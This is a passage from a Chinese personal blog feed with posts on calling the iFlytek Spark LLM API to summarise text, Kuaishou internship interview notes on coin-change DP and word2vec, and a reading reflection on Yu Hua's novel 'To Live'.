src="/2024/12/12/%E4%BD%BF%E7%94%A8%E5%A4%A7%E6%A8%A1%E5%9E%8BAPI%E7%94%9F%E6%88%90%E6%91%98%E8%A6%81/image_Spn_gBiljU.png"></p><p>选择左侧的“Spark4.0 Ultra”大模型，可以免费领取 100000 个 token。然后右侧显示当前用户的 APPID、APISecret 和 APIKey，之后的步骤中会用到这几个信息。</p><hr><h1 id="3-生成摘要"><a href="#3-生成摘要" class="headerlink" title="3 生成摘要"></a>3 生成摘要</h1><p>之后使用 <code>sparkai</code> 库来调用讯飞星火大模型的 API，生成给定文章的摘要。以下是代码示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sparkai.core.messages <span class="keyword">import</span> ChatMessage</span><br><span class="line"><span class="keyword">from</span> sparkai.llm.llm <span class="keyword">import</span> ChatSparkLLM, ChunkPrintHandler</span><br><span class="line"></span><br><span class="line">SPARKAI_URL = <span class="string">&#x27;wss://spark-api.xf-yun.com/v4.0/chat&#x27;</span></span><br><span class="line">SPARKAI_APP_ID = <span class="string">&#x27;&#x27;</span>      <span class="comment"># 你的APPID</span></span><br><span class="line">SPARKAI_API_SECRET = <span class="string">&#x27;&#x27;</span>  <span class="comment"># 你的APISecret</span></span><br><span class="line">SPARKAI_API_KEY = <span class="string">&#x27;&#x27;</span>     <span class="comment"># 你的APIKey</span></span><br><span class="line">SPARKAI_DOMAIN = <span class="string">&#x27;4.0Ultra&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;input.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        article = file.read()</span><br><span class="line"></span><br><span class="line">    spark = ChatSparkLLM(</span><br><span class="line">        spark_api_url=SPARKAI_URL,</span><br><span class="line">        spark_app_id=SPARKAI_APP_ID,</span><br><span class="line">        spark_api_key=SPARKAI_API_KEY,</span><br><span class="line">        spark_api_secret=SPARKAI_API_SECRET,</span><br><span class="line">        spark_llm_domain=SPARKAI_DOMAIN,</span><br><span class="line">        streaming=<span class="literal">False</span>,</span><br><span class="line">    )</span><br><span class="line">    messages = [ChatMessage(</span><br><span class="line">        role=<span class="string">&quot;user&quot;</span>,</span><br><span class="line">        content=<span class="string">&#x27;请根据以下文章写一个摘要，简单总结主要内容，不超过 150 字：&#x27;</span> + article</span><br><span class="line">    )]</span><br><span class="line">    handler = ChunkPrintHandler()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;摘要生成中...&#x27;</span>)</span><br><span class="line">    result = spark.generate([messages], callbacks=[handler])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;生成结束...&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    abstract = result.generations[<span class="number">0</span>][<span class="number">0</span>].text</span><br><span class="line">    <span class="built_in">print</span>(abstract)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(abstract)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里将需要生成摘要的内容放入 <code>input.txt</code> 文件中，生成的内容输出到 <code>output.txt</code> 文件中。</p><p><code>input.txt</code> 文件内容如下：</p><p><img src="/2024/12/12/%E4%BD%BF%E7%94%A8%E5%A4%A7%E6%A8%A1%E5%9E%8BAPI%E7%94%9F%E6%88%90%E6%91%98%E8%A6%81/image_tGfr_1c_cp.png"></p><p>运行上述代码后，<code>output.txt</code> 文件内容如下：</p><p><img src="/2024/12/12/%E4%BD%BF%E7%94%A8%E5%A4%A7%E6%A8%A1%E5%9E%8BAPI%E7%94%9F%E6%88%90%E6%91%98%E8%A6%81/image_n823fO1Ipg.png"></p><hr><h1 id="4-参考资料"><a href="#4-参考资料" class="headerlink" title="4 参考资料"></a>4 参考资料</h1><ol><li><a href="https://www.xfyun.cn/doc/spark/Web.html#%E5%BF%AB%E9%80%9F%E8%B0%83%E7%94%A8%E9%9B%86%E6%88%90%E6%98%9F%E7%81%AB%E8%AE%A4%E7%9F%A5%E5%A4%A7%E6%A8%A1%E5%9E%8B%EF%BC%88python%E7%A4%BA%E4%BE%8B%EF%BC%89" title="星火认知大模型Web API文档">星火认知大模型Web API文档</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 大模型 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大模型 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面试记录7：快手技术二面</title>
      <link href="/2024/12/11/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%957%EF%BC%9A%E5%BF%AB%E6%89%8B%E6%8A%80%E6%9C%AF%E4%BA%8C%E9%9D%A2/"/>
      <url>/2024/12/11/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%957%EF%BC%9A%E5%BF%AB%E6%89%8B%E6%8A%80%E6%9C%AF%E4%BA%8C%E9%9D%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="1-面试背景"><a href="#1-面试背景" class="headerlink" title="1 面试背景"></a>1 面试背景</h1><ul><li>面试公司：快手</li><li>面试岗位：推荐算法实习生【模型算法】</li><li>面试类型：技术二面</li><li>面试时间：2024-12-10 14:00~15:00</li><li>面试结果：待定</li></ul><hr><h1 id="2-整体感受"><a href="#2-整体感受" class="headerlink" title="2 整体感受"></a>2 整体感受</h1><p>第一眼感觉面试官 30~40 岁之间，之后没有让我自我介绍，直接让我找一个自己做的好的项目介绍。当时感觉面试官有点不一样，一般都先让自我介绍。</p><p>之后问了我几个问题，我都答上来了，然后就是手撕代码环节，也是很快就做出来了，最后面试官的意思基本就是通过了，问我什么时候能去之类的。总之，还是挺好的，找到了实习。</p><p>后来了解到面试官是那个组的 leader 😮。</p><hr><h1 id="3-提问的问题"><a href="#3-提问的问题" class="headerlink" title="3 提问的问题"></a>3 提问的问题</h1><blockquote><p>面试官：新闻推荐比赛的数据集规模大概是多少？</p></blockquote><p>数据集的话是一共有30万个用户，然后是20万个用户作为训练集，然后5万个用户作为公共的测试集，剩下的5万作为私有的测试集。然后新闻的话大概是60万个新闻。</p><blockquote><p>面试官：你的方案有什么创新点？</p></blockquote><p>首先我对传统的协同过滤进行了改进，传统的协同过滤只考虑两个物品，比如说同时被点击的次数，但是并没有考虑点击顺序和点击时间的权重。balabala……</p><blockquote><p>面试官：除了做一些特征工程，模型结构上有啥变化吗？</p></blockquote><p>balabala……</p><p>总之面试官问的问题我都答上来了，在此就不赘述了。</p><hr><h1 id="4-手撕代码"><a href="#4-手撕代码" class="headerlink" title="4 手撕代码"></a>4 手撕代码</h1><p>一共就一道题，考的是动态规划，力扣原题<a href="https://leetcode.cn/problems/coin-change/" title="322. 零钱兑换">322. 零钱兑换</a>。因为这题之前自己做过，所以看到题目就知道用动态规划做。但是具体的状态定义也忘记了，所以当时现想的。题目如下：</p><p>给你一个整数数组 <code>coins</code> ，表示不同面额的硬币；以及一个整数 <code>amount</code> ，表示总金额。</p><p>计算并返回可以凑成总金额所需的 <strong>最少的硬币个数</strong> 。如果没有任何一种硬币组合能组成总金额，返回 <code>-1</code> 。可以认为每种硬币的数量是无限的。</p><ol><li>状态表示：$f[i]$ 表示凑成总金额为 $i$ 所需的最少硬币个数</li><li>状态计算：对于每个总金额 $i$ ，枚举每枚硬币 $coins[j]$ ，如果 $i \geq coins[j]$ ，则:</li></ol><p>$$<br>f[i] &#x3D; \min(f[i], f[i - coins[j]] + 1)</p><p>$$</p><p>代码实现如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">f = [inf] * (amount + <span class="number">1</span>)</span><br><span class="line">coins.sort()</span><br><span class="line">f[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(amount + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> coin <span class="keyword">in</span> coins:</span><br><span class="line">        <span class="keyword">if</span> coin &gt; i: </span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        f[i] = <span class="built_in">min</span>(f[i], f[i - coin] + <span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> f[amount] == inf:</span><br><span class="line">    <span class="built_in">print</span>(-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">else</span>: </span><br><span class="line">    <span class="built_in">print</span>(f[amount]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一开始写的时候没有写 <code>coin &gt; i</code> ，所以不对，后来发现了这个问题，然后测试用例都对了。面试官还夸我做的真快哈哈哈，拿捏了。</p>]]></content>
      
      
      <categories>
          
          <category> 找工作 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>读书记录6：活着</title>
      <link href="/2024/12/10/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%956%EF%BC%9A%E6%B4%BB%E7%9D%80/"/>
      <url>/2024/12/10/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%956%EF%BC%9A%E6%B4%BB%E7%9D%80/</url>
      
        <content type="html"><![CDATA[<p><img src="/2024/12/10/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%956%EF%BC%9A%E6%B4%BB%E7%9D%80/image_TavQlwWBFx.png"></p><blockquote><p>《活着》是中国当代作家余华创作的长篇小说，首次发表于《收获》1992年第6期。</p></blockquote><h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1 前言"></a>1 前言</h1><p>2024-09-11 看完的书今天才有机会把读后感写下，当时看这本的感受就是一个：惨。感觉自己每天的生活和福贵相比真的幸福极了。所以还有什么理由不享受当下的生活呢？还有什么理由不开心呢？</p><hr><h1 id="2-经典语录"><a href="#2-经典语录" class="headerlink" title="2 经典语录"></a>2 经典语录</h1><ol><li>做人还是平常点好，争这个争那个，争来争去赔了自己的命。</li><li>人要是累得整天没力气，就不会去乱想了。</li><li>世界上没有一条道路是重复的，也没有一个人生是能够替代的。</li><li>人是为活着本身而活着的，而不是为了活着之外的任何事物所活着。</li><li>生活是属于每个人自己的感受，不属于任何别人的看法。</li><li>只要一家人天天在一起，也就不在乎什么福分了。</li><li>只要我始终保持事事留心的好学态度，即使衰老也算不得什么痛苦。</li><li>最恐怖的莫过于那个懂你的人在某一刻突然离开了你，整个生命就像不能承受般坍塌，你遥遥无期的盼望，却换来和陌生人一般的回答，伤心之处莫过于此。</li><li>父母越是关注你，对你的期望就越高，他们的关心像雪一样不断落到你的身上，最终把你压垮。</li><li>长日尽处，我站在你的面前，你将看到我的疤痕，知道我曾经受伤，也曾经痊愈。</li></ol><hr><h1 id="3-允许无常"><a href="#3-允许无常" class="headerlink" title="3 允许无常"></a>3 允许无常</h1><p>诗人曾丰有诗云：“不如意处人人有，未放心时事事非。”人生海海，生命的底色便是无常，充满着各种不幸。</p><p>对于命运的叵测，有的人一味沉浸在痛苦里，纠结难过，最后丧失生活的勇气。<strong>而内心强大的人，总能够坦然面对人生起落，允许所有事与愿违。</strong></p><p>《活着》里，福贵一出生就是地主家的少爷。他们家有着一百多亩地，是远近闻名的大户人家。福贵住着豪门大院，身穿绫罗绸缎，衣食住行都有佣人和长工打理，是典型的“富二代”。</p><p>可他偏偏不学好，学会了逛窑子和赌钱。结果没多久，在一次赌博中，他中了赌场龙二的计谋，输光了家产。</p><p>一夜之间，福贵家一贫如洗。他们辞退了所有佣人，搬进茅草屋，换了粗布衣，生活从天堂跌进地狱。福贵的爹最终不堪重负，一命呜呼；紧接着，老丈人也接走了怀着孕的妻子家珍……</p><p>面对着接踵而至的打击，福贵没有痛哭流涕，也没有自怨自艾。</p><p>他振作起来，从龙二手里租了五亩地，每天起早贪黑地干活，靠自己的双手养活家庭。可让人没想到的是，多年后，龙二因为被定为地主恶霸，突然被拉走枪毙了。死之前，他还对福贵喊：“福贵啊，我可是替你死的。”</p><p>福贵输掉了家产，却赢得生命；龙二赢得大笔财产，却丢了命。</p><p>所以古人说：<strong>“祸福无门至，风云不测来。”</strong>人生的祸福没有定数，好事和坏事往往是交替发生的。上一刻可能你还是顺风顺水、万里阳光，下一刻就可能狼狈不堪、愁云惨淡。</p><p><strong>不妨放平心态，允许无常，得之坦然，失之淡然。</strong>当你能够平和面对生活的种种境遇，命运自会有它的馈赠与安排。</p><p><img src="/2024/12/10/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%956%EF%BC%9A%E6%B4%BB%E7%9D%80/image_71z9993qzD.png"></p><hr><h1 id="4-允许离别"><a href="#4-允许离别" class="headerlink" title="4 允许离别"></a>4 允许离别</h1><p>作家蒋勋说过：<strong>人与人之间的关系，除了生离，就是死别。</strong>这个世界上，再亲密的人，也只能陪你走一程。</p><p>龙二死后，福贵的生活没有任何变化。虽然过得贫穷，但有着一双儿女，还有着贤惠的家珍，日子也算是幸福了。</p><p>可是，命运总是不讲道理，非要把所有苦难都砸向福贵。先是儿子有庆，因为给县长的难产妻子献血，竟然被抽血抽到死去。接着是女儿凤霞，她好不容易嫁给了一个合适的人，不料却因为难产大出血而亡。妻子家珍本就有得软骨症，缠绵病榻多年。</p><p>因为儿女的离去，伤心过度，很快也跟着离开人世。而他的偏头女婿二喜，一直都善良能干，却在干活时被楼板砸到，意外去世。面对家人的接连离开，尽管难过，但福贵没有沉湎于悲痛当中。</p><p>他平静地一一埋葬了他们，与外孙苦根相依为命。因为家贫，苦根经常吃不饱饭。有次苦根发烧生病，福贵心疼，就摘了新鲜豆子煮给他吃，结果苦根被撑死。</p><p>就这样，唯一的亲人苦根也离开了福贵。换作常人，当身边的人不断离去，难免会想不开，甚至因为思念而终日痛苦。而福贵却接纳了亲人的离开，他知道，生离死别，都是拦不住的。</p><p>此后，他买下了一头老牛，当作家人彼此陪伴，继续过着自己的日子。</p><p>作家马德说，他人的离开与走散，是我们无法控制的事，也是人生常态。<strong>人活着的必修课之一，就是要学会接受离别。</strong></p><p>身边的亲人、朋友，都不可能一直陪着我们，早晚都要面临分别的那一天。世间聚散不由你我，生死更是难料。相聚时，请好好对待，不辜负对方；离别后，就过好当下生活，别辜负自己。</p><p>一个人最大的成熟，就是允许与接受任何人的离开。</p><p><img src="/2024/12/10/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%956%EF%BC%9A%E6%B4%BB%E7%9D%80/737b4cc60fc01207a2ec94f04734070c_1mHdoDAAVW.png"></p><hr><h1 id="5-允许孤独"><a href="#5-允许孤独" class="headerlink" title="5 允许孤独"></a>5 允许孤独</h1><p>在《活着》的最后，福贵失去了所有亲人，和所有依靠。在村里，年老的他，总是喜欢一个人独来独往，陪伴他的只有那头老黄牛。</p><p>他独自耕作，独自生活，每日迎着阳光和晚霞歌唱。尽管孑然一身，但他却也无牵无挂，无忧无虑，活着简单又真实。</p><p>周国平在《做自己的朋友》中写道：<strong>“一个人是否是自己的朋友，就看他能否独处，独处是否感到充实。”</strong></p><p>孤独是人生的常态，我们都曾有过茕茕孑立，默默独行的时刻。一味害怕孤独，你只能被内心的寂寞吞噬。当你懂得接纳孤独，反而能从独处中实现生命的圆融。</p><p>2013年，51岁的作家刘亮程离开了喧闹的城市。他只身来到新疆天山东麓的一个原始的村庄，在此安家落户。在这僻静之地，他一待就是十年。</p><p>虽然他也时常身处孤独之中，但他却欣然接受，从不会有无人相伴的寂寞之感。天气好的时候，他白天耕作，夜里读书、写作。遇到下雨天，不能到田里，他便窝在书房里，听着雨声，思考人生诸多问题。</p><p>无人问津的独居时光，让他得以不断沉淀，精神愈发自足而丰盈。</p><p>他曾在书中谈过对孤独的理解：</p><blockquote><p><strong>孤独是一种完整的自我，孤独是可以让人享受的。当你孤独时，你知道你的生命完整地回到了自身，你的对面是你刚才还在其中、现在已经脱身而出的那个喧嚣人世。</strong></p></blockquote><p>这正应了一句话：<strong>独处亦有清欢事，未必人生尽相知。</strong></p><p>人生越往前走，越会明白，繁华都只是表象，热闹之外才是生活。孤独是一片诗意的土壤，能够诱发出关于心灵的思考和体验，让人不断走向自我。</p><p>生命的丰盛，从享受孤独开始。学会允许孤独，你才能在自己的小世界里，安顿好自己，过好当下的生活。</p><p><img src="/2024/12/10/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%956%EF%BC%9A%E6%B4%BB%E7%9D%80/a3cd331bc3ba807b791bd7bef7728951_ol--CoZtAe.png"></p><hr><h1 id="6-个人感受"><a href="#6-个人感受" class="headerlink" title="6 个人感受"></a>6 个人感受</h1><p>生活无常，我们不能控制生活的走向，但是我们可以改变自己的所作所为。人生在世，放平心态。什么荣华富贵，在快乐幸福面前一文不值。但是快乐幸福也是要有物质基础的，钱不是目的，最重要的是用钱去做什么。</p><p>什么是生活，生活其实很简单，一日三餐，一年四季。生活其实也很复杂，你永远不知道幸运和不幸下一刻哪个会到来。所以，要接纳生活中一切事情的发生，这样可以以不变应万变。</p><p>福贵，已经成为了我生命中的一部分。我所经历的痛苦远不及福贵的万分之一。倘若让我经受福贵的痛苦，或许我可能都不想活了吧。感谢余华创作出了这么一个人物，一个我素未谋面的朋友。</p><p>珍惜当下，把握当下，享受当下，过好当下，该吃吃该喝喝。珍惜爱你的人和你爱的人，远离你讨厌的人，还有啥过不去的，过自己想要的生活，耶耶耶。</p>]]></content>
      
      
      <categories>
          
          <category> 读书记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面试记录6：快手技术一面</title>
      <link href="/2024/12/09/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%956%EF%BC%9A%E5%BF%AB%E6%89%8B%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/"/>
      <url>/2024/12/09/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%956%EF%BC%9A%E5%BF%AB%E6%89%8B%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="1-面试背景"><a href="#1-面试背景" class="headerlink" title="1 面试背景"></a>1 面试背景</h1><ul><li>面试公司：快手</li><li>面试岗位：推荐算法实习生【模型算法】</li><li>面试类型：技术一面</li><li>面试时间：2024-12-06 15:00~16:00</li><li>面试结果：通过 😊</li></ul><hr><h1 id="2-整体感受"><a href="#2-整体感受" class="headerlink" title="2 整体感受"></a>2 整体感受</h1><p>在面试之前就很想去快手，所以很期待这次面试。面试官一进来感觉挺和善的，而且他还简单自我介绍了一下。面试官看起来年龄不是很大，感觉接近 30 的样子。</p><p>在面试过程中面试官会引导你去思考，有的问题并不是想问出来一个确切的答案，就是想让你自己去思考一下。所以我就遇到了很多开放的题目。</p><p>后面有两道手撕代码，第一道算笛卡尔积，第二道是动态规划，几乎都做出来了。整体感受还不错吧，但是还是要等面试结果出来。</p><hr><h1 id="3-提问的问题"><a href="#3-提问的问题" class="headerlink" title="3 提问的问题"></a>3 提问的问题</h1><h2 id="3-1-word2Vec"><a href="#3-1-word2Vec" class="headerlink" title="3.1 word2Vec"></a>3.1 word2Vec</h2><blockquote><p>面试官：我看你这里用了一个 w2v 的方式对吧，能介绍一下基本的原理吗？</p></blockquote><p><img src="/2024/12/09/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%956%EF%BC%9A%E5%BF%AB%E6%89%8B%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/image_vve7tTYWXB.png"></p><p>首先介绍一下 Word2Vec，Word2Vec 是一个生成对“词”的向量表达的模型。分为词袋模型和跳元模型。</p><p>利用物品序列是由特定用户的浏览、购买等行为产生的历史行为记录序列来生成 Embedding。输入向量表达就是输入层到隐层的权重矩阵 $\mathcal{W}_{V \times N}$，而输出向量表达就是隐层到输出层的权重矩阵 $\mathcal{W}^{‘}_{N \times V}$。</p><p><img src="/2024/12/09/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%956%EF%BC%9A%E5%BF%AB%E6%89%8B%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/image_aX65SPQRj-.png"></p><p>在获得输入向量矩阵 $\mathcal{W}_{V \times N}$ 后，其中每一行对应的权重向量就是通常意义上的“词向量”。于是这个权重矩阵自然转换成了 Word2Vec 的查找表（lookup table）。</p><p><img src="/2024/12/09/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%956%EF%BC%9A%E5%BF%AB%E6%89%8B%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/clipImg_4n1K1CUo8S.png"></p><p>假设语料库中的词的数量为 10000，就意味着输出层神经元有 10000 个，在每次迭代更新隐层到输出层神经元的权重时，都需要计算所有字典中的所有 10000 个词的预测误差（prediction error），在实际训练过程中几乎无法承受这样巨大的计算量。</p><p>为了减轻 Word2Vec 的训练负担，往往采用负采样（Negative Sampling）的方法进行训练。相比原来需要计算所有字典中所有词的预测误差，负采样方法只需要对采样出的几个负样本计算预测误差。</p><p>在此情况下， Word2Vec 模型的优化目标从一个多分类问题退化成了一个近似二分类问题，如下式所示：</p><p>$$<br>E&#x3D;-\log \sigma\left(\boldsymbol{v}_{w_{o}}^{\prime}{ }^{\mathrm{T}} \boldsymbol{h}\right)-\sum_{w_{j} \in W_{\text {neg }}} \log \sigma\left(-\boldsymbol{v}_{w_{j}}^{\prime}{ }^{\mathrm{T}} \boldsymbol{h}\right)<br>$$</p><p>其中 $\boldsymbol{v}_{w_{o}}^{\prime}$ 是输出词向量（即正样本），$\boldsymbol{h}$ 是隐层向量，$W_{neg}$ 是负样本集合，$\boldsymbol{v}_{w_{j}}^{\prime}$ 是负样本词向量。一般来说负样本集合的规模 $k$ 在小数据集中取 2~5，在大数据集中取 5~20，所以计算量会大大降低。</p><p>实际上，加快 Word2Vec 训练速度的方法还有分层 softmax，但实现较为复杂，且最终效果没有明显由于负采样方法，因此较少采用。</p><h3 id="3-1-1-分层-softmax"><a href="#3-1-1-分层-softmax" class="headerlink" title="3.1.1 分层 softmax"></a>3.1.1 分层 softmax</h3><blockquote><p>面试官：你刚才也说到 w2v 有两种方式，你知道比如他做层次 softmax 的时候，在梯度更新的时候，它是由叶子节点和非叶子结点，这一块你知道是怎么去分析的吗？</p></blockquote><p>层序 softmax（hierarchical softmax）使用二叉树，其中树的每个叶节点表示词表 $\mathcal{V}$ 中的一个词。</p><p><img src="/2024/12/09/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%956%EF%BC%9A%E5%BF%AB%E6%89%8B%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/image_rcccJFVvgT.png"></p><p>用 $L(w)$ 表示二叉树中表示字 $w$ 的从根节点到叶节点的路径上的节点数（包括两端）。设 $n(w,j)$ 为该路径上的 $j^\mathrm{th}$ 节点，其上下文字向量为 $\mathbf{u}_{n(w, j)}$。例如，$L(w_3) &#x3D; 4$。分层softmax将 条件概率近似为：</p><p>$$<br>P(w_o \mid w_c) &#x3D; \prod_{j&#x3D;1}^{L(w_o)-1} \sigma\left( [![  n(w_o, j+1) &#x3D; \text{leftChild}(n(w_o, j)) ]!] \cdot \mathbf{u}_{n(w_o, j)}^\top \mathbf{v}_c\right)<br>$$</p><p>其中函数 $\sigma$ 为 sigmoid 激活函数，$\text{leftChild}(n)$ 是节点 $n$ 的左子节点：</p><ol><li>如果 $x$ 为真，$[[x]] &#x3D; 1$</li><li>否则 $[[x]] &#x3D; -1$</li></ol><p>为了说明，让我们计算给定词 $w_c$ 生成词 $w_3$ 的条件概率。这需要 $w_c$ 的词向量 $\mathbf{v}_c$ 和从根到 $w_3$ 的路径（上图中加粗的路径）上的非叶节点向量之间的点积，该路径依次向左、向右和向左遍历：</p><p>$$<br>P(w_3 \mid w_c) &#x3D; \sigma(\mathbf{u}_{n(w_3, 1)}^\top \mathbf{v}_c) \cdot \sigma(-\mathbf{u}_{n(w_3, 2)}^\top \mathbf{v}_c) \cdot \sigma(\mathbf{u}_{n(w_3, 3)}^\top \mathbf{v}_c)<br>$$</p><p>由 $\sigma(x)+\sigma(-x) &#x3D; 1$，它认为基于任意词 $w_c$ 生成词表 $\mathcal{V}$ 中所有词的条件概率总和为 $1$：</p><p>$$<br>\sum_{w \in \mathcal{V}} P(w \mid w_c) &#x3D; 1<br>$$</p><p>幸运的是，由于二叉树结构，$L(w_o)-1$ 大约与 $\mathcal{O}(\text{log}_2|\mathcal{V}|)$ 是一个数量级。当词表大小 $\mathcal{V}$ 很大时，与没有近似训练的相比，使用分层 softmax 的每个训练步的计算代价显著降低。</p><h3 id="3-1-2-负采样"><a href="#3-1-2-负采样" class="headerlink" title="3.1.2 负采样"></a>3.1.2 负采样</h3><blockquote><p>面试官：降采样的话你知道是怎么做的吗？</p></blockquote><p>负采样修改了原目标函数。给定中心词 $w_c$ 的上下文窗口，任意上下文词 $w_o$ 来自该上下文窗口的被认为是由下式建模概率的事件：</p><p>$$<br>P(D&#x3D;1\mid w_c, w_o) &#x3D; \sigma(\mathbf{u}_o^\top \mathbf{v}_c)<br>$$</p><p>其中 $\sigma$ 使用了 sigmoid 激活函数的定义：</p><p>$$<br>\sigma(x) &#x3D; \frac{1}{1+\exp(-x)}<br>$$</p><p>从最大化文本序列中所有这些事件的联合概率开始训练词嵌入。具体而言，给定长度为 $T$ 的文本序列，以 $w^{(t)}$ 表示时间步 $t$ 的词，并使上下文窗口为 $m$，考虑最大化联合概率：</p><p>$$<br>\prod_{t&#x3D;1}^{T} \prod_{-m \leq j \leq m,\ j \neq 0} P(D&#x3D;1\mid w^{(t)}, w^{(t+j)})<br>$$</p><p>然而，上式只考虑那些正样本的事件。仅当所有词向量都等于无穷大时，上式中的联合概率才最大化为1。当然，这样的结果毫无意义。为了使目标函数更有意义，负采样添加从预定义分布中采样的负样本。</p><p>用 $S$ 表示上下文词 $w_o$ 来自中心词 $w_c$ 的上下文窗口的事件。对于这个涉及 $w_o$ 的事件，从预定义分布 $P(w)$ 中采样 $K$ 个不是来自这个上下文窗口噪声词。用 $N_k$ 表示噪声词 $w_k$（$k&#x3D;1, \ldots, K$）不是来自 $w_c$ 的上下文窗口的事件。假设正例和负例 $S, N_1, \ldots, N_K$ 的这些事件是相互独立的。负采样将上式中的联合概率（仅涉及正例）重写为：</p><p>$$<br>\prod_{t&#x3D;1}^{T} \prod_{-m \leq j \leq m,\ j \neq 0} P(w^{(t+j)} \mid w^{(t)})<br>$$</p><p>通过事件 $S, N_1, \ldots, N_K$ 近似条件概率：</p><p>$$<br>P(w^{(t+j)} \mid w^{(t)}) &#x3D;P(D&#x3D;1\mid w^{(t)}, w^{(t+j)})\prod_{k&#x3D;1,\ w_k \sim P(w)}^K P(D&#x3D;0\mid w^{(t)}, w_k)<br>$$</p><p>分别用 $i_t$ 和 $h_k$ 表示词 $w^{(t)}$ 和噪声词 $w_k$ 在文本序列的时间步 $t$ 处的索引。上式中关于条件概率的对数损失为：</p><p><img src="/2024/12/09/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%956%EF%BC%9A%E5%BF%AB%E6%89%8B%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/image.png"></p><p>我们可以看到，现在每个训练步的梯度计算成本与词表大小无关，而是线性依赖于 $K$。当将超参数 $K$ 设置为较小的值时，在负采样的每个训练步处的梯度的计算成本较小。</p><p><img src="/2024/12/09/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%956%EF%BC%9A%E5%BF%AB%E6%89%8B%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/image4.png"></p><p><img src="/2024/12/09/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%956%EF%BC%9A%E5%BF%AB%E6%89%8B%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/image5.png"></p><h3 id="3-1-3-高频词和低频词"><a href="#3-1-3-高频词和低频词" class="headerlink" title="3.1.3 高频词和低频词"></a>3.1.3 高频词和低频词</h3><p>对于低频词，会设置阈值（默认 $5$），对于出现频次低于该阈值的词会直接舍弃，同时训练集中也会被删除。</p><p>高频词提供的信息相对较少，为了提高低频词的词向量质量，有必要对高频词进行限制。高频词对应的词向量在训练时，不会发生明显的变化，因此在训练是可以减少对这些词的训练，从而提升速度。</p><p>源码中使用 Sub-Sampling 技巧来解决高频词的问题，能带来 2~10 